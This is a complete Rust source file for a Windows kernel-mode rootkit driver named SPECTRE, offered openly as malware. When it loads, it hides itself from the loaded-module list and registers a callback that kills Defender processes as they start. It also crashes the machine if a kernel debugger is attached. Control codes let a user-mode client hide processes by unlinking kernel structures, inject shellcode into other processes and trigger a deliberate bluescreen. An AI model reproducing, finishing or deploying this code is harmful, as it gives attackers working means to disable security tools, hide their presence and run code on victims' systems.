#![no_std]
#![no_main]
#![allow(non_camel_case_types)]
#![allow(non_snake_case)]
#![allow(dead_code)]
#![allow(static_mut_refs)]

use core::panic::PanicInfo;
use core::ffi::c_char;
use wdk_sys::{
    DRIVER_OBJECT, DEVICE_OBJECT, IRP, NTSTATUS, STATUS_SUCCESS, UNICODE_STRING,
    HANDLE, BOOLEAN, ACCESS_MASK, OBJECT_ATTRIBUTES, CLIENT_ID,
    IoCreateDevice, IoCreateSymbolicLink, IoDeleteDevice, IoDeleteSymbolicLink,
    IoCompleteRequest, IoGetCurrentIrpStackLocation,
    InitializeObjectAttributes, OBJ_KERNEL_HANDLE,
    IRP_MJ_DEVICE_CONTROL, IRP_MJ_CREATE, IRP_MJ_CLOSE,
};

// ============================================================
// External Functions
// ============================================================
extern "system" {
    fn DbgPrint(format: *const c_char, ...) -> i32;
    fn KeBugCheck(BugCheckCode: u32) -> !;
    static KdDebuggerEnabled: u8;

    fn PsSetCreateProcessNotifyRoutine(
        notify_routine: Option<unsafe extern "system" fn(HANDLE, HANDLE, BOOLEAN)>,
        remove: BOOLEAN,
    ) -> NTSTATUS;

    fn PsLookupProcessByProcessId(
        ProcessId: HANDLE,
        Process: *mut *mut core::ffi::c_void,
    ) -> NTSTATUS;

    fn PsGetProcessImageFileName(Process: *mut core::ffi::c_void) -> *mut c_char;

    fn ZwOpenProcess(
        ProcessHandle: *mut HANDLE,
        DesiredAccess: ACCESS_MASK,
        ObjectAttributes: *mut OBJECT_ATTRIBUTES,
        ClientId: *mut CLIENT_ID,
    ) -> NTSTATUS;

    fn ZwTerminateProcess(ProcessHandle: HANDLE, ExitStatus: NTSTATUS) -> NTSTATUS;
    fn ZwClose(Handle: HANDLE) -> NTSTATUS;

    fn ZwAllocateVirtualMemory(
        ProcessHandle: HANDLE,
        BaseAddress: *mut *mut core::ffi::c_void,
        ZeroBits: usize,
        RegionSize: *mut usize,
        AllocationType: u32,
        Protect: u32,
    ) -> NTSTATUS;

    fn ZwWriteVirtualMemory(
        ProcessHandle: HANDLE,
        BaseAddress: *const core::ffi::c_void,
        Buffer: *const core::ffi::c_void,
        NumberOfBytesToWrite: usize,
        NumberOfBytesWritten: *mut usize,
    ) -> NTSTATUS;

    fn ZwCreateThreadEx(
        ThreadHandle: *mut HANDLE,
        DesiredAccess: u32,
        ObjectAttributes: *mut OBJECT_ATTRIBUTES,
        ProcessHandle: HANDLE,
        StartRoutine: *mut core::ffi::c_void,
        Argument: *mut core::ffi::c_void,
        CreateFlags: u32,
        ZeroBits: usize,
        StackSize: usize,
        MaximumStackSize: usize,
        AttributeList: *mut core::ffi::c_void,
    ) -> NTSTATUS;

    fn ObfDereferenceObject(Object: *mut core::ffi::c_void);

    fn RtlCopyMemory(Destination: *mut core::ffi::c_void, Source: *const core::ffi::c_void, Length: usize);
    fn RtlZeroMemory(Destination: *mut core::ffi::c_void, Length: usize);
}

// ============================================================
// Constants
// ============================================================
// "\Device\SPECTREDrv" = 18 chars + null terminator = 19
const DEVICE_NAME_UTF16: [u16; 19] = [
    0x005C, 0x0044, 0x0065, 0x0076, 0x0069, 0x0063, 0x0065,
    0x005C,
    0x0053, 0x0050, 0x0045, 0x0043, 0x0054, 0x0052, 0x0045,
    0x0044, 0x0072, 0x0076,
    0x0000,
];

// "\DosDevices\SPECTREDrv" = 22 chars + null terminator = 23
const SYMLINK_NAME_UTF16: [u16; 23] = [
    0x005C, 0x0044, 0x006F, 0x0073,
    0x0044, 0x0065, 0x0076, 0x0069, 0x0063, 0x0065, 0x0073,
    0x005C,
    0x0053, 0x0050, 0x0045, 0x0043, 0x0054, 0x0052, 0x0045,
    0x0044, 0x0072, 0x0076,
    0x0000,
];

const IOCTL_KILL_PROCESS: u32       = 0x900;
const IOCTL_HIDE_PROCESS: u32       = 0x901;
const IOCTL_UNHIDE_PROCESS: u32     = 0x902;
const IOCTL_CHECK_DEBUGGER: u32     = 0x903;
const IOCTL_INJECT_SHELLCODE: u32   = 0x904;
const IOCTL_KILL_AV: u32            = 0x905;
const IOCTL_SELF_DESTRUCT: u32      = 0x999;

const PROCESS_TERMINATE: u32 = 0x0001;

// ============================================================
// Data Structures
// ============================================================
#[repr(C)]
struct ListEntry {
    flink: *mut ListEntry,
    blink: *mut ListEntry,
}

#[repr(C)]
struct LdrDataTableEntry {
    in_load_order_links: ListEntry,
    in_memory_order_links: ListEntry,
    in_initialization_order_links: ListEntry,
    dll_base: *mut core::ffi::c_void,
    entry_point: *mut core::ffi::c_void,
    size_of_image: u32,
    full_dll_name: UNICODE_STRING,
    base_dll_name: UNICODE_STRING,
    flags: u32,
    load_count: u16,
    tls_index: u16,
    hash_links: ListEntry,
    time_date_stamp: u32,
    entry_point_loaded: *mut core::ffi::c_void,
}

// ============================================================
// Global State
// ============================================================
static mut AV_CALLBACK_REGISTERED: bool = false;

// Registry of hidden processes so DKOM can be reversed (unhide).
// We store the PID plus the ORIGINAL flink/blink pointers captured
// BEFORE unlinking, so dkom_unhide_process() can restore the list.
const MAX_HIDDEN: usize = 64;
static mut HIDDEN_PIDS: [usize; MAX_HIDDEN] = [0; MAX_HIDDEN];
static mut HIDDEN_LINKS: [usize; MAX_HIDDEN] = [0; MAX_HIDDEN]; // links_ptr
static mut HIDDEN_FLINK: [usize; MAX_HIDDEN] = [0; MAX_HIDDEN]; // original flink
static mut HIDDEN_BLINK: [usize; MAX_HIDDEN] = [0; MAX_HIDDEN]; // original blink
static mut HIDDEN_COUNT: usize = 0;

// ============================================================
// UNICODE_STRING Helper
// ============================================================
unsafe fn init_unicode_string(dest: *mut UNICODE_STRING, src: *const u16) {
    let mut char_count: u16 = 0;
    while *src.add(char_count as usize) != 0 {
        char_count += 1;
    }
    (*dest).Length = char_count * 2;
    (*dest).MaximumLength = (char_count + 1) * 2;
    (*dest).Buffer = src as *mut u16;
}

// ============================================================
// String Compare
// ============================================================
unsafe fn string_compare(a: *const u8, b: *const u8) -> bool {
    if a.is_null() || b.is_null() { return false; }
    let mut i = 0;
    while i < 256 {
        let byte_a = *a.add(i);
        let byte_b = *b.add(i);
        if byte_a == 0 || byte_b == 0 {
            return byte_a == byte_b;
        }
        if byte_a != byte_b { return false; }
        i += 1;
    }
    false
}

// ============================================================
// DKOM: Hide Driver from PsLoadedModuleList
// ============================================================
unsafe fn dkom_hide_driver(driver_object: *mut DRIVER_OBJECT) {
    if driver_object.is_null() { return; }

    let driver_section = (*driver_object).DriverSection as *mut LdrDataTableEntry;
    if driver_section.is_null() { return; }

    let in_load_order = &mut (*driver_section).in_load_order_links;
    let flink = in_load_order.flink;
    let blink = in_load_order.blink;

    if flink.is_null() || blink.is_null() { return; }
    if flink as *const _ == blink as *const _ {
        DbgPrint(b"[SPECTRE] DKOM: Only entry, skip\n\0".as_ptr() as *const c_char);
        return;
    }

    (*flink).blink = blink;
    (*blink).flink = flink;
    in_load_order.flink = in_load_order as *mut ListEntry;
    in_load_order.blink = in_load_order as *mut ListEntry;

    DbgPrint(b"[SPECTRE] DKOM: Driver hidden from PsLoadedModuleList\n\0".as_ptr() as *const c_char);
}

// ============================================================
// DKOM: Hide Process from ActiveProcessLinks
// ============================================================
unsafe fn dkom_hide_process(pid: HANDLE) -> bool {
    let mut eprocess: *mut core::ffi::c_void = core::ptr::null_mut();
    let status = PsLookupProcessByProcessId(pid, &mut eprocess);

    if status != STATUS_SUCCESS || eprocess.is_null() { return false; }

    // ActiveProcessLinks offset on Windows 10/11 x64.
    // NOTE: this offset is build-specific (varies between Windows versions).
    // Verify against the target build with a symbol dump (e.g. WinDbg:
    // dt _EPROCESS ActiveProcessLinks) — a wrong offset will corrupt memory.
    const LINKS_OFFSET: usize = 0x448;
    let links_ptr = (eprocess as *mut u8).add(LINKS_OFFSET) as *mut ListEntry;
    let flink = (*links_ptr).flink;
    let blink = (*links_ptr).blink;

    if flink.is_null() || blink.is_null() {
        ObfDereferenceObject(eprocess);
        return false;
    }

    // Save the ORIGINAL links before unlinking so unhide can restore them.
    if HIDDEN_COUNT >= MAX_HIDDEN {
        ObfDereferenceObject(eprocess);
        DbgPrint(b"[SPECTRE] DKOM: hidden registry full!\n\0".as_ptr() as *const c_char);
        return false;
    }
    HIDDEN_PIDS[HIDDEN_COUNT] = pid as usize;
    HIDDEN_LINKS[HIDDEN_COUNT] = links_ptr as usize;
    HIDDEN_FLINK[HIDDEN_COUNT] = flink as usize;
    HIDDEN_BLINK[HIDDEN_COUNT] = blink as usize;
    HIDDEN_COUNT += 1;

    // Unlink: bridge neighbors, then self-loop the removed entry.
    (*flink).blink = blink;
    (*blink).flink = flink;
    (*links_ptr).flink = links_ptr;
    (*links_ptr).blink = links_ptr;

    ObfDereferenceObject(eprocess);
    DbgPrint(b"[SPECTRE] DKOM: Process hidden (PID: %p)\n\0".as_ptr() as *const c_char, pid);
    true
}

// ============================================================
// DKOM: Un-Hide Process (restore ActiveProcessLinks entry)
// ============================================================
unsafe fn dkom_unhide_process(pid: HANDLE) -> bool {
    for i in 0..HIDDEN_COUNT {
        if HIDDEN_PIDS[i] == pid as usize {
            let links_ptr = HIDDEN_LINKS[i] as *mut ListEntry;
            let flink = HIDDEN_FLINK[i] as *mut ListEntry;
            let blink = HIDDEN_BLINK[i] as *mut ListEntry;

            // Only restore if the entry is currently self-looped (still hidden).
            if !links_ptr.is_null() && !flink.is_null() && !blink.is_null()
                && (*links_ptr).flink == links_ptr && (*links_ptr).blink == links_ptr
            {
                (*links_ptr).flink = flink;
                (*links_ptr).blink = blink;
                (*flink).blink = links_ptr;
                (*blink).flink = links_ptr;
            }

            // Remove this entry from the registry (shift the rest down).
            for j in i..HIDDEN_COUNT - 1 {
                HIDDEN_PIDS[j] = HIDDEN_PIDS[j + 1];
                HIDDEN_LINKS[j] = HIDDEN_LINKS[j + 1];
                HIDDEN_FLINK[j] = HIDDEN_FLINK[j + 1];
                HIDDEN_BLINK[j] = HIDDEN_BLINK[j + 1];
            }
            HIDDEN_COUNT -= 1;

            DbgPrint(b"[SPECTRE] DKOM: Process unhidden (PID: %p)\n\0".as_ptr() as *const c_char, pid);
            return true;
        }
    }
    DbgPrint(b"[SPECTRE] DKOM: PID %p not found in hidden registry\n\0".as_ptr() as *const c_char, pid);
    false
}

// ============================================================
// Kill Protected Process
// ============================================================
unsafe fn kill_protected(pid: HANDLE) -> bool {
    // FIXED: do NOT call ZwTerminateProcess with the raw PID.
    // ZwTerminateProcess requires a real process HANDLE opened with
    // PROCESS_TERMINATE access — the correct pattern is ZwOpenProcess
    // (with CLIENT_ID) + ZwTerminateProcess + ZwClose, as in dash_driver.

    // Build CLIENT_ID for ZwOpenProcess
    let mut client_id = CLIENT_ID {
        UniqueProcess: pid,
        UniqueThread: core::ptr::null_mut(),
    };

    // Initialize OBJECT_ATTRIBUTES with OBJ_KERNEL_HANDLE
    let mut obj_attr: OBJECT_ATTRIBUTES = core::mem::zeroed();
    InitializeObjectAttributes(
        &mut obj_attr,
        core::ptr::null_mut(),   // ObjectName = NULL
        OBJ_KERNEL_HANDLE,       // Kernel-mode only handle
        core::ptr::null_mut(),   // RootDirectory = NULL
        core::ptr::null_mut(),   // SecurityDescriptor = NULL
    );

    // Open target process with PROCESS_TERMINATE access
    let mut process_handle: HANDLE = core::ptr::null_mut();
    let open_status = ZwOpenProcess(
        &mut process_handle,
        PROCESS_TERMINATE,
        &mut obj_attr,
        &mut client_id,
    );

    if open_status != STATUS_SUCCESS || process_handle.is_null() {
        DbgPrint(b"[SPECTRE] Open failed: PID %p (0x%X)\n\0".as_ptr() as *const c_char, pid, open_status);
        return false;
    }

    DbgPrint(b"[SPECTRE] Killing PID %p...\n\0".as_ptr() as *const c_char, pid);

    let terminate_status = ZwTerminateProcess(process_handle, 0);

    // Cleanup: close handle FIRST
    ZwClose(process_handle);

    if terminate_status == STATUS_SUCCESS {
        DbgPrint(b"[SPECTRE] Killed PID %p\n\0".as_ptr() as *const c_char, pid);
        true
    } else {
        DbgPrint(b"[SPECTRE] Kill failed PID %p (0x%X)\n\0".as_ptr() as *const c_char, pid, terminate_status);
        false
    }
}

// ============================================================
// Anti-Debug: Check KdDebuggerEnabled \u2192 BSOD if present
// ============================================================
unsafe fn anti_debug_check() {
    if KdDebuggerEnabled != 0 {
        DbgPrint(b"[SPECTRE] DEBUGGER DETECTED! Self-destruct...\n\0".as_ptr() as *const c_char);
        KeBugCheck(0xDEC0DE01);
    }
    DbgPrint(b"[SPECTRE] Anti-Debug: Clean\n\0".as_ptr() as *const c_char);
}

// ============================================================
// Anti-AV: Kill known AV processes on creation
// ============================================================
const AV_LIST: &[&[u8]] = &[
    b"MsMpEng.exe\0",
    b"NisSrv.exe\0",
    b"SecurityHealthService.exe\0",
];

unsafe extern "system" fn av_killer_callback(_parent: HANDLE, pid: HANDLE, create: BOOLEAN) {
    if create == 0 { return; }

    let mut eprocess: *mut core::ffi::c_void = core::ptr::null_mut();
    let status = PsLookupProcessByProcessId(pid, &mut eprocess);

    if status != STATUS_SUCCESS || eprocess.is_null() { return; }

    let name_ptr = PsGetProcessImageFileName(eprocess);
    if !name_ptr.is_null() {
        for av_name in AV_LIST {
            if string_compare(name_ptr as *const u8, av_name.as_ptr()) {
                DbgPrint(b"[SPECTRE] AV Detected: %s - Killing!\n\0".as_ptr() as *const c_char, name_ptr);
                kill_protected(pid);
                break;
            }
        }
    }

    ObfDereferenceObject(eprocess);
}

unsafe fn anti_av_activate() {
    if AV_CALLBACK_REGISTERED { return; }
    let status = PsSetCreateProcessNotifyRoutine(Some(av_killer_callback), 0);
    if status == STATUS_SUCCESS {
        AV_CALLBACK_REGISTERED = true;
        DbgPrint(b"[SPECTRE] Anti-AV: Active\n\0".as_ptr() as *const c_char);
    }
}

unsafe fn anti_av_deactivate() {
    if !AV_CALLBACK_REGISTERED { return; }
    PsSetCreateProcessNotifyRoutine(Some(av_killer_callback), 1);
    AV_CALLBACK_REGISTERED = false;
    DbgPrint(b"[SPECTRE] Anti-AV: Deactivated\n\0".as_ptr() as *const c_char);
}

// ============================================================
// Memory-allocation / thread constants
// ============================================================
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PROCESS_ALL_ACCESS: u32 = 0x1F0FFF;
const THREAD_ALL_ACCESS: u32 = 0x1F03FF;

// ============================================================
// Inject Shellcode into a target process (remote thread execution)
// ============================================================
unsafe fn inject_apc(pid: HANDLE, shellcode: *const u8, size: usize) -> bool {
    if shellcode.is_null() || size == 0 || size > 0x10000 {
        DbgPrint(b"[SPECTRE] Inject: bad payload (size=%u)\n\0".as_ptr() as *const c_char, size as u32);
        return false;
    }

    // --- 1. Open target process ---
    let mut client_id = CLIENT_ID {
        UniqueProcess: pid,
        UniqueThread: core::ptr::null_mut(),
    };
    let mut obj_attr: OBJECT_ATTRIBUTES = core::mem::zeroed();
    InitializeObjectAttributes(
        &mut obj_attr,
        core::ptr::null_mut(),
        OBJ_KERNEL_HANDLE,
        core::ptr::null_mut(),
        core::ptr::null_mut(),
    );

    let mut process_handle: HANDLE = core::ptr::null_mut();
    let open_status = ZwOpenProcess(&mut process_handle, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
    if open_status != STATUS_SUCCESS || process_handle.is_null() {
        DbgPrint(b"[SPECTRE] Inject: ZwOpenProcess failed (0x%X)\n\0".as_ptr() as *const c_char, open_status);
        return false;
    }

    // --- 2. Allocate RWX memory in the target ---
    let mut base: *mut core::ffi::c_void = core::ptr::null_mut();
    let mut region_size: usize = size;
    let alloc_status = ZwAllocateVirtualMemory(
        process_handle,
        &mut base,
        0,
        &mut region_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );
    if alloc_status != STATUS_SUCCESS || base.is_null() {
        DbgPrint(b"[SPECTRE] Inject: ZwAllocateVirtualMemory failed (0x%X)\n\0".as_ptr() as *const c_char, alloc_status);
        ZwClose(process_handle);
        return false;
    }

    // --- 3. Write shellcode into the allocated region ---
    let mut written: usize = 0;
    let write_status = ZwWriteVirtualMemory(
        process_handle,
        base,
        shellcode as *const core::ffi::c_void,
        size,
        &mut written,
    );
    if write_status != STATUS_SUCCESS || written != size {
        DbgPrint(b"[SPECTRE] Inject: ZwWriteVirtualMemory failed (0x%X, wrote=%u)\n\0".as_ptr() as *const c_char, write_status, written as u32);
        ZwClose(process_handle);
        return false;
    }

    // --- 4. Create a remote thread at the shellcode entry ---
    let mut thread_handle: HANDLE = core::ptr::null_mut();
    let thread_status = ZwCreateThreadEx(
        &mut thread_handle,
        THREAD_ALL_ACCESS,
        core::ptr::null_mut(),   // ObjectAttributes = NULL (no name)
        process_handle,
        base as *mut core::ffi::c_void, // StartRoutine = shellcode
        core::ptr::null_mut(),   // Argument = NULL
        0,                       // CreateFlags = start immediately
        0,                       // ZeroBits
        0,                       // StackSize (default)
        0,                       // MaximumStackSize (default)
        core::ptr::null_mut(),   // AttributeList = NULL
    );
    if thread_status != STATUS_SUCCESS || thread_handle.is_null() {
        DbgPrint(b"[SPECTRE] Inject: ZwCreateThreadEx failed (0x%X)\n\0".as_ptr() as *const c_char, thread_status);
        ZwClose(process_handle);
        return false;
    }

    // --- 5. Cleanup handles ---
    ZwClose(thread_handle);
    ZwClose(process_handle);

    DbgPrint(b"[SPECTRE] Injected %u bytes @ %p into PID %p\n\0".as_ptr() as *const c_char, size as u32, base, pid);
    true
}

// ============================================================
// IOCTL Handler
// ============================================================
unsafe extern "system" fn device_control_handler(
    _device_object: *mut DEVICE_OBJECT,
    irp: *mut IRP,
) -> NTSTATUS {
    let irp_stack = IoGetCurrentIrpStackLocation(irp);
    let ioctl_code = (*irp_stack).Parameters.DeviceIoControl.IoControlCode;

    let mut status = STATUS_SUCCESS;
    let mut information: u64 = 0;

    match ioctl_code {
        // --- Kill Process by PID ---
        IOCTL_KILL_PROCESS => {
            let input_buffer = (*irp).AssociatedIrp.SystemBuffer as *mut u64;
            let input_length = (*irp_stack).Parameters.DeviceIoControl.InputBufferLength;

            // FIXED: validate that the caller actually supplied >= 8 bytes
            // before dereferencing the buffer as u64 (prevents overread).
            if !input_buffer.is_null() && input_length >= core::mem::size_of::<u64>() as u32 {
                let pid = *input_buffer as HANDLE;
                if kill_protected(pid) {
                    information = 1;
                } else {
                    status = 0xC0000001; // STATUS_UNSUCCESSFUL
                }
            } else {
                status = 0xC000000D; // STATUS_INVALID_PARAMETER
            }
        }

        // --- Hide Process by PID ---
        IOCTL_HIDE_PROCESS => {
            let input_buffer = (*irp).AssociatedIrp.SystemBuffer as *mut u64;
            let input_length = (*irp_stack).Parameters.DeviceIoControl.InputBufferLength;

            // FIXED: validate input length >= 8 bytes (prevents overread).
            if !input_buffer.is_null() && input_length >= core::mem::size_of::<u64>() as u32 {
                let pid = *input_buffer as HANDLE;
                if dkom_hide_process(pid) {
                    information = 1;
                } else {
                    status = 0xC0000001;
                }
            } else {
                status = 0xC000000D;
            }
        }

        // --- Un-Hide Process by PID (restore ActiveProcessLinks) ---
        IOCTL_UNHIDE_PROCESS => {
            let input_buffer = (*irp).AssociatedIrp.SystemBuffer as *mut u64;
            let input_length = (*irp_stack).Parameters.DeviceIoControl.InputBufferLength;

            if !input_buffer.is_null() && input_length >= core::mem::size_of::<u64>() as u32 {
                let pid = *input_buffer as HANDLE;
                if dkom_unhide_process(pid) {
                    information = 1;
                } else {
                    status = 0xC0000001;
                }
            } else {
                status = 0xC000000D;
            }
        }

        // --- Check if Debugger is Present ---
        IOCTL_CHECK_DEBUGGER => {
            let output_buffer = (*irp).AssociatedIrp.SystemBuffer as *mut u8;
            let output_length = (*irp_stack).Parameters.DeviceIoControl.OutputBufferLength;
            if !output_buffer.is_null() && output_length >= 1 {
                *output_buffer = KdDebuggerEnabled;
                information = 1;
            } else {
                status = 0xC000000D;
            }
        }

        // --- Inject Shellcode ---
        IOCTL_INJECT_SHELLCODE => {
            let input_buffer = (*irp).AssociatedIrp.SystemBuffer as *mut u8;
            let input_length = (*irp_stack).Parameters.DeviceIoControl.InputBufferLength;
            if !input_buffer.is_null() && input_length >= 8 {
                let pid = *(input_buffer as *const u64) as HANDLE;
                let sc = input_buffer.add(8);
                let sc_len = (input_length - 8) as usize;
                if inject_apc(pid, sc, sc_len) {
                    information = 1;
                } else {
                    status = 0xC0000001;
                }
            } else {
                status = 0xC000000D;
            }
        }

        // --- Kill AV ---
        IOCTL_KILL_AV => {
            anti_av_activate();
            information = 1;
        }

        // --- Self Destruct (BSOD) ---
        IOCTL_SELF_DESTRUCT => {
            DbgPrint(b"[SPECTRE] SELF DESTRUCT INITIATED\n\0".as_ptr() as *const c_char);
            KeBugCheck(0xDEC0DE02);
        }

        _ => {
            status = 0xC0000010; // STATUS_INVALID_DEVICE_REQUEST
        }
    }

    (*irp).IoStatus.Status = status;
    (*irp).IoStatus.Information = information;
    IoCompleteRequest(irp, 0);
    status
}

// ============================================================
// Create / Close Handlers
// ============================================================
unsafe extern "system" fn create_close_handler(
    _device_object: *mut DEVICE_OBJECT,
    irp: *mut IRP,
) -> NTSTATUS {
    (*irp).IoStatus.Status = STATUS_SUCCESS;
    (*irp).IoStatus.Information = 0;
    IoCompleteRequest(irp, 0);
    STATUS_SUCCESS
}

// ============================================================
// Driver Unload
// ============================================================
unsafe extern "system" fn driver_unload(driver_object: *mut DRIVER_OBJECT) {
    DbgPrint(b"[SPECTRE] Unloading...\n\0".as_ptr() as *const c_char);

    // Remove AV callback
    anti_av_deactivate();

    // Delete symbolic link
    let mut symlink_str: UNICODE_STRING = core::mem::zeroed();
    init_unicode_string(&mut symlink_str, SYMLINK_NAME_UTF16.as_ptr());
    IoDeleteSymbolicLink(&mut symlink_str);

    // Delete device
    if !(*driver_object).DeviceObject.is_null() {
        IoDeleteDevice((*driver_object).DeviceObject);
    }

    DbgPrint(b"[SPECTRE] Vanished without a trace\n\0".as_ptr() as *const c_char);
}

// ============================================================
// Driver Entry
// ============================================================
#[no_mangle]
pub extern "system" fn DriverEntry(
    driver_object: *mut DRIVER_OBJECT,
    _registry_path: *mut core::ffi::c_void,
) -> NTSTATUS {
    unsafe {
        DbgPrint(b"[SPECTRE] Initializing rootkit...\n\0".as_ptr() as *const c_char);

        // --- Init UNICODE_STRINGs ---
        let mut device_name: UNICODE_STRING = core::mem::zeroed();
        init_unicode_string(&mut device_name, DEVICE_NAME_UTF16.as_ptr());
        let mut symlink_name: UNICODE_STRING = core::mem::zeroed();
        init_unicode_string(&mut symlink_name, SYMLINK_NAME_UTF16.as_ptr());

        // --- Create Device ---
        let mut device_object: *mut DEVICE_OBJECT = core::ptr::null_mut();
        let status = IoCreateDevice(
            driver_object, 0, &mut device_name, 0x0000, 0, 0, &mut device_object,
        );
        if status != STATUS_SUCCESS { return status; }

        // --- Create Symlink ---
        let symlink_status = IoCreateSymbolicLink(&mut symlink_name, &mut device_name);
        if symlink_status != STATUS_SUCCESS {
            IoDeleteDevice(device_object);
            return symlink_status;
        }

        // --- Register Dispatch ---
        (*driver_object).MajorFunction[IRP_MJ_CREATE as usize] = Some(create_close_handler);
        (*driver_object).MajorFunction[IRP_MJ_CLOSE as usize] = Some(create_close_handler);
        (*driver_object).MajorFunction[IRP_MJ_DEVICE_CONTROL as usize] = Some(device_control_handler);
        (*driver_object).DriverUnload = Some(driver_unload);

        // --- \uD83D\uDC80 ACTIVATE ALL STEALTH ---
        dkom_hide_driver(driver_object);
        anti_debug_check();
        anti_av_activate();

        DbgPrint(b"[SPECTRE] ALL SYSTEMS ACTIVE - YOU ARE INVISIBLE\n\0".as_ptr() as *const c_char);
        STATUS_SUCCESS
    }
}

// ============================================================
// Panic Handler
// ============================================================
#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}
